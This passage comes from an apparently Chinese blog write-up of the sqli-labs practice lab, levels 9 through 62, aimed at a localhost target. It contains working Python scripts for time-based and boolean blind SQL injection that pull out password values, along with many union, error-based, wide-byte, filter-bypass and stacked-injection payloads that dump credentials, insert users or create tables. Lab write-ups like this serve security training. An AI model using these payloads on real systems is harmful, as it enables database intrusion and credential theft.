password)if __name__ == &quot;__main__&quot;:    getLength()    getPayload()</code></pre><h2 id="Less-9（单引号时间盲注）"><a href="#Less-9（单引号时间盲注）" class="headerlink" title="Less-9（单引号时间盲注）"></a>Less-9（单引号时间盲注）</h2><pre><code class="python">import requestsimport stringurl = &quot;http://localhost:8088/sqli-labs-master/Less-9/&quot;length = 0letters = string.ascii_letters # lowercase&#39;&#39;&#39;盲注结果：|- security    |- emails    |- referers    |- uagents    |- users        |- id        |- username        |- password            |- Dumb            |- ...&#39;&#39;&#39;def getLength():    global length    for i in range(2,11):        #payload = &quot;&#39; or if(length(database())=&quot; + str(i) + &quot;,sleep(4),1)#&quot;        #payload = &quot;&#39; or if(length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=&quot; + str(i) + &quot;,sleep(4),1)#&quot;        #payload = &quot;&#39; or if(length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1))=&quot; + str(i) + &quot;,sleep(4),1)#&quot;        payload = &quot;&#39; or if(length((select password from users limit 0,1))=&quot; + str(i) + &quot;,sleep(4),1)#&quot;        data = &#123;            &#39;id&#39;:payload        &#125;        try:            r = requests.get(url,params=data,timeout=3)            print(&quot;【*】 present length: &quot; + str(i))        except requests.exceptions.ReadTimeout as e:            length = i            print(&quot;【+】 right length: &quot; + str(i))            breakdef getPayload():    password = &quot;&quot;    for i in range(1,length+1):        &#39;&#39;&#39;        left = ord(&#39;a&#39;)        right = ord(&#39;z&#39;)        while left != right:            mid = int((left + right) / 2)            payload = &quot;&#39; or if(ASCII(mid(database(),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;,1,sleep(4))#&quot;            #payload = &quot;&#39; or ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 4,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            #payload = &quot;&#39; or ASCII(mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            #payload = &quot;&#39; or ASCII(mid((select password from users limit 1,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            data = &#123;                &#39;id&#39;:payload            &#125;            try:                r = requests.get(url,params=data,timeout=3)                left = mid + 1                print(str(i) + &quot; &gt; &quot; + chr(mid))            except requests.exceptions.ReadTimeout as e:                right = mid                print(str(i) + &quot; &lt;= &quot; + chr(mid))        password += chr(left)        print(&quot;【+】 password: &quot; + password)        &#39;&#39;&#39;        for j in letters:            #payload = &quot;&#39; or if(ASCII(mid(database(),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j)) + &quot;,sleep(4),1)#&quot;            #payload = &quot;&#39; or if(ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j)) + &quot;,sleep(4),1)#&quot;            #payload = &quot;&#39; or if(ASCII(mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j)) + &quot;,sleep(4),1)#&quot;            payload = &quot;&#39; or if(ASCII(mid((select password from users limit 0,1),&quot; + str(i) + &quot;,1))=&quot; + str(ord(j)) + &quot;,sleep(4),1)#&quot;            data = &#123;                &#39;id&#39;:payload            &#125;            try:                r = requests.get(url,params=data,timeout=3)                print(&quot;【*】 present password: &quot; + str(i) + &quot; = &quot; + j)            except requests.exceptions.ReadTimeout as e:                password += j                print(&quot;【+】 password: &quot; + password)                breakif __name__ == &quot;__main__&quot;:    getLength()    getPayload()</code></pre><h2 id="Less-10（双引号时间盲注）"><a href="#Less-10（双引号时间盲注）" class="headerlink" title="Less-10（双引号时间盲注）"></a>Less-10（双引号时间盲注）</h2><pre><code>Less-9 单引号改双引号</code></pre><h2 id="Less-11（用户名加密的单引号-union-注入）"><a href="#Less-11（用户名加密的单引号-union-注入）" class="headerlink" title="Less-11（用户名加密的单引号 union 注入）"></a>Less-11（用户名加密的单引号 union 注入）</h2><pre><code>uname = admin&#39;#&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()#&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;#&#39; union select 1,group_concat(password) from users#</code></pre><h2 id="Less-12（用户名加密的双引号括号-union-注入）"><a href="#Less-12（用户名加密的双引号括号-union-注入）" class="headerlink" title="Less-12（用户名加密的双引号括号 union 注入）"></a>Less-12（用户名加密的双引号括号 union 注入）</h2><pre><code>uname = admin&quot;)#less-11 单引号改双引号括号</code></pre><h2 id="Less-13（用户名的单引号括号双注入）"><a href="#Less-13（用户名的单引号括号双注入）" class="headerlink" title="Less-13（用户名的单引号括号双注入）"></a>Less-13（用户名的单引号括号双注入）</h2><pre><code>admin&#39;) union select count(*),concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=database() limit 3,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a#admin&#39;) union select count(*),concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; limit 2,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a#admin&#39;) union select count(*),concat(&#39;~&#39;,(select password from users limit 0,1),&#39;~&#39;,floor(rand()*2)) as a from information_schema.tables group by a#</code></pre><h2 id="Less-14（用户名的双引号双注入）"><a href="#Less-14（用户名的双引号双注入）" class="headerlink" title="Less-14（用户名的双引号双注入）"></a>Less-14（用户名的双引号双注入）</h2><pre><code>less-13 单引号括号改双引号</code></pre><h2 id="Less-15（用户名的单引号布尔注入）"><a href="#Less-15（用户名的单引号布尔注入）" class="headerlink" title="Less-15（用户名的单引号布尔注入）"></a>Less-15（用户名的单引号布尔注入）</h2><pre><code class="python">import requestsimport stringurl = &quot;http://localhost:8088/sqli-labs-master/Less-15/&quot;length = 0&#39;&#39;&#39;盲注结果：|- security    |- emails    |- referers    |- uagents    |- users        |- id        |- username        |- password            |- Dumb            |- ...&#39;&#39;&#39;def getLength():    global length    for i in range(2,11):        #payload = &quot;admin&#39; and length(database())=&quot; + str(i) + &quot;#&quot;        #payload = &quot;admin&#39; and length((select table_name from information_schema.tables where table_schema=database() limit 3,1))=&quot; + str(i) + &quot;#&quot;        #payload = &quot;admin&#39; and length((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1))=&quot; + str(i) + &quot;#&quot;        payload = &quot;admin&#39; and length((select password from users limit 0,1))=&quot; + str(i) + &quot;#&quot;        data = &#123;            &#39;uname&#39;:payload,            &#39;passwd&#39;:123        &#125;        r = requests.post(url,data=data)        if &quot;flag.jpg&quot; in r.text:            length = i            print(&quot;【+】 right length: &quot; + str(i))            print(&quot;--------------------------------------------&quot;)            break        else:            print(&quot;【*】 wrong length: &quot; + str(i))def getPayload():    password = &quot;&quot;    for i in range(1,length+1):        left = ord(&#39;A&#39;)        right = ord(&#39;z&#39;)        while left != right:            mid = int((left + right) / 2)            #payload = &quot;admin&#39; and ASCII(mid(database(),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            #payload = &quot;admin&#39; and ASCII(mid((select table_name from information_schema.tables where table_schema=database() limit 3,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            #payload = &quot;admin&#39; and ASCII(mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 2,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            payload = &quot;admin&#39; and ASCII(mid((select password from users limit 0,1),&quot; + str(i) + &quot;,1))&gt;&quot; + str(mid) + &quot;#&quot;            data = &#123;                &#39;uname&#39;:payload,                &#39;passwd&#39;:123            &#125;            r = requests.post(url,data=data)            if &quot;flag.jpg&quot; in r.text:                left = mid + 1                print(str(i) + &quot; &gt; &quot; + chr(mid))            else:                right = mid                print(str(i) + &quot; &lt;= &quot; + chr(mid))        password += chr(left)        print(&quot;【+】 password: &quot; + password)if __name__ == &quot;__main__&quot;:    getLength()    getPayload()</code></pre><h2 id="Less-16（用户名的双引号括号布尔注入）"><a href="#Less-16（用户名的双引号括号布尔注入）" class="headerlink" title="Less-16（用户名的双引号括号布尔注入）"></a>Less-16（用户名的双引号括号布尔注入）</h2><pre><code></code></pre><h2 id="Less-17（用户名加密的单引号报错注入）"><a href="#Less-17（用户名加密的单引号报错注入）" class="headerlink" title="Less-17（用户名加密的单引号报错注入）"></a>Less-17（用户名加密的单引号报错注入）</h2><pre><code></code></pre><h2 id="Less-18（User-Agent-报错注入）"><a href="#Less-18（User-Agent-报错注入）" class="headerlink" title="Less-18（User-Agent 报错注入）"></a>Less-18（User-Agent 报错注入）</h2><pre><code>User-Agent: &#39; or updatexml(1,concat(&#39;~&#39;,(select table_name from information_schema where table_schema=database),&#39;~&#39;),1) or</code></pre><h2 id="Less-19（Referer-报错注入）"><a href="#Less-19（Referer-报错注入）" class="headerlink" title="Less-19（Referer 报错注入）"></a>Less-19（Referer 报错注入）</h2><pre><code></code></pre><h2 id="Less-20（User-Agent-报错注入）"><a href="#Less-20（User-Agent-报错注入）" class="headerlink" title="Less-20（User-Agent 报错注入）"></a>Less-20（User-Agent 报错注入）</h2><pre><code>上 burpsuite 修改 Cookie：Cookie: uname=&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()#Cookie: uname=&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;#Cookie: uname=&#39; union select 1,2,group_concat(password) from users#</code></pre><h2 id="Less-21（User-Agent-加密报错注入）"><a href="#Less-21（User-Agent-加密报错注入）" class="headerlink" title="Less-21（User-Agent 加密报错注入）"></a>Less-21（User-Agent 加密报错注入）</h2><pre><code>less-20 单引号改单引号括号再用 base64 加密</code></pre><h2 id="Less-22（User-Agent-加密报错注入）"><a href="#Less-22（User-Agent-加密报错注入）" class="headerlink" title="Less-22（User-Agent 加密报错注入）"></a>Less-22（User-Agent 加密报错注入）</h2><pre><code>less-20 单引号改双引号再用 base64 加密</code></pre><h2 id="Less-23-（过滤注释）"><a href="#Less-23-（过滤注释）" class="headerlink" title="Less-23 （过滤注释）"></a>Less-23 （过滤注释）</h2><pre><code>?id=&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() and &#39;1?id=&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39; and &#39;1?id=&#39; union select 1,2,group_concat(password) from users where &#39;&#39;=&#39;</code></pre><h2 id="Less-24-（二次排序漏洞）"><a href="#Less-24-（二次排序漏洞）" class="headerlink" title="Less-24 （二次排序漏洞）"></a>Less-24 （二次排序漏洞）</h2><pre><code>先注册一个 admin&#39;# 账号再修改 admin&#39;# 的密码，新密码即为 admin 的密码。</code></pre><h2 id="Less-25-（过滤-or-amp-and）"><a href="#Less-25-（过滤-or-amp-and）" class="headerlink" title="Less-25 （过滤 or &amp; and）"></a>Less-25 （过滤 or &amp; and）</h2><pre><code>一次性关键词绕过 用 oorr 和 aandnd 绕过?id=&#39; union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+?id=&#39; union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_schema=database() aandnd table_name=&#39;users&#39;--+?id=&#39; union select 1,2,group_concat(passwoorrd)  from users--+</code></pre><h2 id="Less-25a（过滤-or-amp-and-）"><a href="#Less-25a（过滤-or-amp-and-）" class="headerlink" title="Less-25a（过滤 or &amp; and ）"></a>Less-25a（过滤 or &amp; and ）</h2><pre><code>表面上是盲注，背地里是 less-25 无引号的 union 注入...</code></pre><h2 id="Less-26-（过滤空格和注释的报错注入）"><a href="#Less-26-（过滤空格和注释的报错注入）" class="headerlink" title="Less-26 （过滤空格和注释的报错注入）"></a>Less-26 （过滤空格和注释的报错注入）</h2><pre><code>本题全部空格都过滤了，所以采取报错注入or 用 || 代替，and 用 %26%26 代替（&amp;&amp;也过滤了）注释则用 ||&#39;1 闭合?id=&#39;||updatexml(1,concat(&#39;~&#39;,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=database())),&#39;~&#39;),1)||&#39;1?id=&#39;||updatexml(1,concat(&#39;~&#39;,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_schema=database())%26%26(table_name=&#39;user&#39;)),&#39;~&#39;),1)||&#39;1?id=&#39;||updatexml(1,concat(&#39;~&#39;,(select(group_concat(passwoorrd))from(users)),&#39;~&#39;),1)||&#39;1</code></pre><h2 id="Less-26a（过滤空格和注释的布尔注入）"><a href="#Less-26a（过滤空格和注释的布尔注入）" class="headerlink" title="Less-26a（过滤空格和注释的布尔注入）"></a>Less-26a（过滤空格和注释的布尔注入）</h2><pre><code>空格全部被过滤，此题又不能进行报错注入，所以采取布尔注入</code></pre><h2 id="Less-27-（过滤-nion-和-select-的-union-注入）"><a href="#Less-27-（过滤-nion-和-select-的-union-注入）" class="headerlink" title="Less-27 （过滤 nion 和 select 的 union 注入）"></a>Less-27 （过滤 nion 和 select 的 union 注入）</h2><pre><code>union 注入：通过脚本可知空格可以用 %09、%0a-%0d 绕过非一次性关键词绕过，union 和 select 用大小写 unioN 和 selecT 绕过?id=&#39;%0AunioN%0AselecT%0A1,2,group_concat(table_name)%0Afrom%0Ainformation_schema.tables%0Awhere%0Atable_schema=database()%0Aand%0A&#39;1?id=&#39;%0AunioN%0AselecT%0A1,2,group_concat(column_name)%0Afrom%0Ainformation_schema.columns%0Awhere%0Atable_schema=database()%0Aand%0Atable_name=&#39;users&#39;%0Aand%0A&#39;1?id=&#39;%0AunioN%0AselecT%0A1,2,group_concat(column_name)%0Afrom%0Ausers%0Awhere%0A&#39;1或者?id=&#39;%0AunioN%0AselecT%0A1,(selecT%0Agroup_concat(password)%0Afrom%0Ausers),3%0A||&#39;报错注入：其他与 less-26 类似?id=&#39;||updatexml(1,concat(&#39;~&#39;,(selecT(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),&#39;~&#39;),1)||&#39;1?id=&#39;||updatexml(1,concat(&#39;~&#39;,(selecT(group_concat(column_name))from(information_schema.columns)where(table_schema=database())%26%26(table_name=&#39;users&#39;)),&#39;~&#39;),1)||&#39;1?id=&#39;||updatexml(1,concat(&#39;~&#39;,(selecT(group_concat(password))from(users)),&#39;~&#39;),1)||&#39;1</code></pre><h2 id="Less-27a（过滤-nion-和-select-的时间盲注）"><a href="#Less-27a（过滤-nion-和-select-的时间盲注）" class="headerlink" title="Less-27a（过滤 nion 和 select 的时间盲注）"></a>Less-27a（过滤 nion 和 select 的时间盲注）</h2><pre><code>双引号 + 时间盲注其他同 less-27</code></pre><h2 id="Less-28（过滤-nion-和-select-的-union-注入）"><a href="#Less-28（过滤-nion-和-select-的-union-注入）" class="headerlink" title="Less-28（过滤 nion 和 select 的 union 注入）"></a>Less-28（过滤 nion 和 select 的 union 注入）</h2><pre><code>有个小bug，网上的 payload 都是 union 注入，但是我的空格不能用 %a0 绕过...所以只好用布尔盲注?id=1&#39;)and(ascii(mid(database(),1,1))=115)and(&#39;1&#39;)=(&#39;1</code></pre><h2 id="Less-28a（过滤-union-和-select-的布尔注入）"><a href="#Less-28a（过滤-union-和-select-的布尔注入）" class="headerlink" title="Less-28a（过滤 union 和 select 的布尔注入）"></a>Less-28a（过滤 union 和 select 的布尔注入）</h2><pre><code>同 less-28</code></pre><h2 id="Less-29（WAF1）"><a href="#Less-29（WAF1）" class="headerlink" title="Less-29（WAF1）"></a>Less-29（WAF1）</h2><pre><code>这题是？？？签到题？？？?id=&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?id=&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+?id=&#39; union select 1,group_concat(password),3 from users--+</code></pre><h2 id="Less-30（WAF2）"><a href="#Less-30（WAF2）" class="headerlink" title="Less-30（WAF2）"></a>Less-30（WAF2）</h2><pre><code>less-29 单引号改双引号</code></pre><h2 id="Less-31（WAF3）"><a href="#Less-31（WAF3）" class="headerlink" title="Less-31（WAF3）"></a>Less-31（WAF3）</h2><pre><code>less-29 单引号改双引号括号</code></pre><h2 id="Less-32（宽字节注入）"><a href="#Less-32（宽字节注入）" class="headerlink" title="Less-32（宽字节注入）"></a>Less-32（宽字节注入）</h2><pre><code>基于 get 方法的宽字节注入，加 %df 绕过?id=%df&#39; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?id=%df&#39; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+?id=%df&#39; union select 1,group_concat(password),3 from users--+</code></pre><h2 id="Less-33（宽字节注入）"><a href="#Less-33（宽字节注入）" class="headerlink" title="Less-33（宽字节注入）"></a>Less-33（宽字节注入）</h2><pre><code>同 less-32</code></pre><h2 id="Less-34（用户名和密码加反斜杠）"><a href="#Less-34（用户名和密码加反斜杠）" class="headerlink" title="Less-34（用户名和密码加反斜杠）"></a>Less-34（用户名和密码加反斜杠）</h2><pre><code>基于 post 的宽字节注入，又可以将 utf-8 转换为 utf-16 或 utf-32，例如将&#39;转为 utf-16 为 %EF%BF%BD&#39;/�&#39;万能密码 �&#39; or 1# 不知道为什么我的电脑只有这个能用admin=�&#39; union select 1,group_concat(table_name) from information_schema.tables where table_schema=database()# admin=�&#39; union select 1,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273# admin=�&#39; union select 1,group_concat(password) from users# </code></pre><h2 id="Less-35（加反斜杠没引号的-union-注入）"><a href="#Less-35（加反斜杠没引号的-union-注入）" class="headerlink" title="Less-35（加反斜杠没引号的 union 注入）"></a>Less-35（加反斜杠没引号的 union 注入）</h2><pre><code>?id=0 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()--+?id=0 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;--+?id=0 union select 1,group_concat(password),3 from users--+</code></pre><h2 id="Less-36（基于-get-的-mysql-real-escape-string-函数的-union-注入）"><a href="#Less-36（基于-get-的-mysql-real-escape-string-函数的-union-注入）" class="headerlink" title="Less-36（基于 get 的 mysql_real_escape_string() 函数的 union 注入）"></a>Less-36（基于 get 的 mysql_real_escape_string() 函数的 union 注入）</h2><pre><code>同 less-32</code></pre><h2 id="Less-37（基于-post-的-mysql-real-escape-string-函数的-union-注入）"><a href="#Less-37（基于-post-的-mysql-real-escape-string-函数的-union-注入）" class="headerlink" title="Less-37（基于 post 的 mysql_real_escape_string() 函数的 union 注入）"></a>Less-37（基于 post 的 mysql_real_escape_string() 函数的 union 注入）</h2><pre><code>同 less-34</code></pre><h2 id="Less-38（堆叠注入）"><a href="#Less-38（堆叠注入）" class="headerlink" title="Less-38（堆叠注入）"></a>Less-38（堆叠注入）</h2><pre><code>stacked injection：在mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束。所以我们可以利用分号进行多聚输入。?id=1&#39;;insert into users(id,username,password) values(15,&#39;less38&#39;,&#39;less38&#39;) -- +</code></pre><h2 id="Less-39（堆叠注入）"><a href="#Less-39（堆叠注入）" class="headerlink" title="Less-39（堆叠注入）"></a>Less-39（堆叠注入）</h2><pre><code>?id=1;insert into users(id,username,password) values(16,&#39;less39&#39;,&#39;less39&#39;) -- +</code></pre><h2 id="Less-40（堆叠注入）"><a href="#Less-40（堆叠注入）" class="headerlink" title="Less-40（堆叠注入）"></a>Less-40（堆叠注入）</h2><pre><code>?id=1&#39;);insert into users(id,username,password) values(17,&#39;less40&#39;,&#39;less40&#39;) -- +</code></pre><h2 id="Less-41（堆叠注入）"><a href="#Less-41（堆叠注入）" class="headerlink" title="Less-41（堆叠注入）"></a>Less-41（堆叠注入）</h2><pre><code>同 less-39 区别于无报错信息</code></pre><h2 id="Less-42（堆叠注入）"><a href="#Less-42（堆叠注入）" class="headerlink" title="Less-42（堆叠注入）"></a>Less-42（堆叠注入）</h2><pre><code>用户名做了转义处理，可以对密码进行堆叠注入login_user=1&amp;login_password=1&#39;;create table less42 like users#</code></pre><h2 id="Less-43（堆叠注入）"><a href="#Less-43（堆叠注入）" class="headerlink" title="Less-43（堆叠注入）"></a>Less-43（堆叠注入）</h2><pre><code>类似 less-42，只是多了个括号login_user=1&amp;login_password=1&#39;);create table less43 like users#</code></pre><h2 id="Less-44（堆叠注入）"><a href="#Less-44（堆叠注入）" class="headerlink" title="Less-44（堆叠注入）"></a>Less-44（堆叠注入）</h2><pre><code>同 less-42 只是没有报错信息</code></pre><h2 id="Less-45（堆叠注入）"><a href="#Less-45（堆叠注入）" class="headerlink" title="Less-45（堆叠注入）"></a>Less-45（堆叠注入）</h2><pre><code>同 less-43 只是没有报错信息</code></pre><h2 id="Less-46（order-by-注入）"><a href="#Less-46（order-by-注入）" class="headerlink" title="Less-46（order by 注入）"></a>Less-46（order by 注入）</h2><pre><code>此题可考虑报错注入和延时注入：1. 直接添加注入语句，?sort=(select ******)；2. 利用一些函数。例如rand()函数等。?sort=rand(sql语句)，对比rand(ture)和rand(false)的结果，可以判断是否注入成功；3. 利用and，例如?sort=1 and (加sql语句)。报错注入：?sort=1 and extractvalue(1,concat(&#39;~&#39;,(select group_concat(table_name) from information_schema.tables where table_schema=database()),&#39;~&#39;))--+?sort=1 and extractvalue(1,concat(&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#39;users&#39;),&#39;~&#39;))--+?sort=1 and extractvalue(1,concat(&#39;~&#39;,(select group_concat(password) from users),&#39;~&#39;))--+延时注入例子 :http://127.0.0.1/sqli-labs-master/Less-46/?sort=(SELECT IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,md5(&#39;1&#39;)),null) FROM (select database() as current) as tb1)http://127.0.0.1/sqli-labs-master/Less-46/?sort=1 and If(ascii(substr(database(),1,1))=116,0,sleep(5))</code></pre><h2 id="Less-47-（order-by-注入）"><a href="#Less-47-（order-by-注入）" class="headerlink" title="Less-47 （order by 注入）"></a>Less-47 （order by 注入）</h2><pre><code>类似 less-46 只是多了一个单引号</code></pre><h2 id="Less-48（order-by-盲注）"><a href="#Less-48（order-by-盲注）" class="headerlink" title="Less-48（order by 盲注）"></a>Less-48（order by 盲注）</h2><pre><code>类似 less-46 无报错信息，所以需要盲注如：?sort=1 and if(length(database())=8,sleep(4),1)--+?sort=1 and if(ascii(left(database(),1))=115,sleep(4),1)--+</code></pre><h2 id="Less-49（order-by-盲注）"><a href="#Less-49（order-by-盲注）" class="headerlink" title="Less-49（order by 盲注）"></a>Less-49（order by 盲注）</h2><pre><code>类似 less-48 多了一个单引号</code></pre><h2 id="Less-50（order-by-堆叠注入）"><a href="#Less-50（order-by-堆叠注入）" class="headerlink" title="Less-50（order by 堆叠注入）"></a>Less-50（order by 堆叠注入）</h2><pre><code>这题使用 mysqli_multi_query 函数，所以可以执行多个语句。?sort=1;create table less50 like users -- +/?sort=1;insert into users(id,username,password)value(18,&#39;less50&#39;,&#39;less50&#39;)#</code></pre><h2 id="Less-51（order-by-堆叠注入）"><a href="#Less-51（order-by-堆叠注入）" class="headerlink" title="Less-51（order by 堆叠注入）"></a>Less-51（order by 堆叠注入）</h2><pre><code>类似 less-50 多了一个单引号</code></pre><h2 id="Less-52（order-by-堆叠注入）"><a href="#Less-52（order-by-堆叠注入）" class="headerlink" title="Less-52（order by 堆叠注入）"></a>Less-52（order by 堆叠注入）</h2><pre><code>同 less-50 没有了注释</code></pre><h2 id="Less-53（order-by-堆叠注入）"><a href="#Less-53（order-by-堆叠注入）" class="headerlink" title="Less-53（order by 堆叠注入）"></a>Less-53（order by 堆叠注入）</h2><pre><code>同 less-51 没有了注释</code></pre><h2 id="Less-54（挑战1）"><a href="#Less-54（挑战1）" class="headerlink" title="Less-54（挑战1）"></a>Less-54（挑战1）</h2><pre><code>依旧是字符型注入，只不过只有十次机会，密码就在 secret 列名里面</code></pre><h2 id="Less-55（挑战2）"><a href="#Less-55（挑战2）" class="headerlink" title="Less-55（挑战2）"></a>Less-55（挑战2）</h2><pre><code>类似 less-54 加了一个括号</code></pre><h2 id="Less-56（挑战3）"><a href="#Less-56（挑战3）" class="headerlink" title="Less-56（挑战3）"></a>Less-56（挑战3）</h2><pre><code>类似 less-54 加了一个单引号括号</code></pre><h2 id="Less-57（挑战4）"><a href="#Less-57（挑战4）" class="headerlink" title="Less-57（挑战4）"></a>Less-57（挑战4）</h2><pre><code>类似 less-54 加了一个双引号</code></pre><h2 id="Less-58（挑战5）"><a href="#Less-58（挑战5）" class="headerlink" title="Less-58（挑战5）"></a>Less-58（挑战5）</h2><pre><code>union 注入失败，但是可以进行报错注入，这次是单引号型的</code></pre><h2 id="Less-59（挑战6）"><a href="#Less-59（挑战6）" class="headerlink" title="Less-59（挑战6）"></a>Less-59（挑战6）</h2><pre><code>类似 less-58 这次是纯数字型</code></pre><h2 id="Less-60（挑战7）"><a href="#Less-60（挑战7）" class="headerlink" title="Less-60（挑战7）"></a>Less-60（挑战7）</h2><pre><code>类似 less-58 这次是双引号括号型的</code></pre><h2 id="Less-61（挑战8）"><a href="#Less-61（挑战8）" class="headerlink" title="Less-61（挑战8）"></a>Less-61（挑战8）</h2><pre><code>类似 less-58 这次真的猜不出...原来是单引号加两层括号...</code></pre><h2 id="Less-62（挑战9）"><a href="#Less-62（挑战9）" class="headerlink" title="Less-62（挑战9）"></a>Less-62（挑战9）</h2><pre><code>单引号括号型，但是 union 注入和报错注入已经失效，页面信息也没有变化所以只能进行时间盲注</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> PRACTICE </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
